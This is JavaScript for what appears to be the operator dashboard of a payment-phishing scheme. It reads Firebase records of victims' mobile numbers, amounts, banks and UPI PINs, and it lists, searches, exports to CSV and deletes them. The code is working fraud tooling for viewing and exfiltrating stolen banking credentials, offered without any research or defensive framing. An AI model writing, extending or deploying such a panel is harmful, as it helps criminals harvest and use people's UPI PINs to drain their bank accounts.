        const firebaseConfig = {
            databaseURL: "https://tsting-94dbc-default-rtdb.firebaseio.com"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Global variables
        let allUsers = [];
        let filteredUsers = [];
        let currentPage = 1;
        const usersPerPage = 10;

        // Load users when page loads
        document.addEventListener('DOMContentLoaded', function() {
            loadUsers();
            
            // Add Enter key support for search
            document.getElementById('searchInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    searchUsers();
                }
            });
        });

        // Load all users from Firebase
        function loadUsers() {
            showLoading(true);
            
            database.ref('users').once('value')
                .then((snapshot) => {
                    const usersData = snapshot.val();
                    allUsers = [];
                    
                    if (usersData) {
                        // Convert object to array
                        Object.keys(usersData).forEach(key => {
                            allUsers.push({
                                id: key,
                                ...usersData[key]
                            });
                        });
                        
                        // Sort by timestamp (newest first)
                        allUsers.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                    }
                    
                    filteredUsers = [...allUsers];
                    updateStatistics();
                    displayUsers();
                    showLoading(false);
                })
                .catch((error) => {
                    console.error('Error loading users:', error);
                    showMessage('Error loading user data. Please try again.', 'error');
                    showLoading(false);
                });
        }

        // Update statistics
        function updateStatistics() {
            // Total submissions only
            document.getElementById('totalSubmissions').textContent = allUsers.length;
        }

        // Display users in table
        function displayUsers() {
            const tableBody = document.getElementById('usersTableBody');
            const noDataDiv = document.getElementById('noData');
            const usersTable = document.getElementById('usersTable');
            
            if (filteredUsers.length === 0) {
                tableBody.innerHTML = '';
                noDataDiv.style.display = 'block';
                usersTable.style.display = 'none';
                updatePagination();
                return;
            }
            
            noDataDiv.style.display = 'none';
            usersTable.style.display = 'block';
            
            // Calculate pagination
            const startIndex = (currentPage - 1) * usersPerPage;
            const endIndex = startIndex + usersPerPage;
            const usersToShow = filteredUsers.slice(startIndex, endIndex);
            
            tableBody.innerHTML = usersToShow.map(user => `
                <tr>
                    <td class="mobile-cell">${user.mobile}</td>
                    <td class="amount-cell">₹${user.amount}</td>
                    <td><span class="bank-cell">${user.bank}</span></td>
                    <td class="pin-cell">${user.pin}</td>
                    <td>
                        <button class="delete-btn" onclick="deleteUser('${user.id}')">
                            Delete
                        </button>
                    </td>
                </tr>
            `).join('');
            
            updatePagination();
        }

        // Update pagination controls
        function updatePagination() {
            const totalPages = Math.ceil(filteredUsers.length / usersPerPage);
            const pageInfo = document.getElementById('pageInfo');
            const prevBtn = document.getElementById('prevPage');
            const nextBtn = document.getElementById('nextPage');
            
            pageInfo.textContent = `Page ${currentPage} of ${totalPages}`;
            prevBtn.disabled = currentPage === 1;
            nextBtn.disabled = currentPage === totalPages || totalPages === 0;
        }

        // Change page
        function changePage(direction) {
            const totalPages = Math.ceil(filteredUsers.length / usersPerPage);
            currentPage += direction;
            
            if (currentPage < 1) currentPage = 1;
            if (currentPage > totalPages) currentPage = totalPages;
            
            displayUsers();
        }

        // Search users
        function searchUsers() {
            const searchTerm = document.getElementById('searchInput').value.toLowerCase().trim();
            const searchResults = document.getElementById('searchResults');
            
            if (searchTerm === '') {
                filteredUsers = [...allUsers];
                searchResults.textContent = '';
            } else {
                filteredUsers = allUsers.filter(user => 
                    user.mobile.includes(searchTerm) ||
                    user.bank.toLowerCase().includes(searchTerm) ||
                    user.amount.includes(searchTerm) ||
                    user.pin.includes(searchTerm)
                );
                
                searchResults.textContent = `Found ${filteredUsers.length} results for "${searchTerm}"`;
                searchResults.style.color = '#666';
                searchResults.style.marginBottom = '15px';
                searchResults.style.fontSize = '14px';
            }
            
            currentPage = 1;
            displayUsers();
        }

        // Delete user
        function deleteUser(userId) {
            if (!confirm('Are you sure you want to delete this user submission?')) {
                return;
            }
            
            database.ref('users/' + userId).remove()
                .then(() => {
                    showMessage('User submission deleted successfully!', 'success');
                    loadUsers(); // Reload data
                })
                .catch((error) => {
                    console.error('Error deleting user:', error);
                    showMessage('Error deleting user submission.', 'error');
                });
        }

        // Export data
        function exportData() {
            if (filteredUsers.length === 0) {
                showMessage('No data to export.', 'error');
                return;
            }
            
            const dataToExport = filteredUsers.length > 0 ? filteredUsers : allUsers;
            const csvContent = convertToCSV(dataToExport);
            
            const blob = new Blob([csvContent], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `user-submissions-${new Date().toISOString().split('T')[0]}.csv`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            
            showMessage('Data exported successfully!', 'success');
        }

        // Convert to CSV
        function convertToCSV(data) {
            const headers = ['Mobile Number', 'Amount', 'Bank', 'UPI Pin'];
            const csvRows = [headers.join(',')];
            
            data.forEach(user => {
                const row = [
                    user.mobile,
                    `"${user.amount}"`,
                    `"${user.bank}"`,
                    user.pin
                ];
                csvRows.push(row.join(','));
            });
            
            return csvRows.join('\n');
        }

        // Clear all data
        function clearAllData() {
            if (!confirm('Are you sure you want to delete ALL user submissions? This action cannot be undone.')) {
                return;
            }
            
            database.ref('users').remove()
                .then(() => {
                    showMessage('All user submissions cleared successfully!', 'success');
                    loadUsers(); // Reload data
                })
                .catch((error) => {
                    console.error('Error clearing data:', error);
                    showMessage('Error clearing user submissions.', 'error');
                });
        }

        // Show/hide loading
        function showLoading(show) {
            document.getElementById('loading').style.display = show ? 'block' : 'none';
        }

        // Show message
        function showMessage(message, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = message;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
            
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 5000);
        }
    